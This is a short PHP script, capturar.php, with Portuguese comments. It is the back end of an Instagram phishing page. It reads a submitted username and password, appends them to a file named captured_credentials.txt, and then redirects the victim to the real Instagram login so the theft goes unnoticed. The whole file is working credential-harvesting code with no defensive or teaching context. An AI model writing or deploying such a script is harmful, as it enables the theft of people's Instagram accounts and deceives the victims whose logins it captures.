<?php
// capturar.php
$data = json_decode(file_get_contents('php://input'), true);
$username = $data['username'];
$password = $data['password'];

// Salve os dados em um arquivo
file_put_contents('captured_credentials.txt', "$username:$password\n", FILE_APPEND);

// Redirecione para o Instagram real
header('Location: https://www.instagram.com/accounts/login/');
exit();
?>
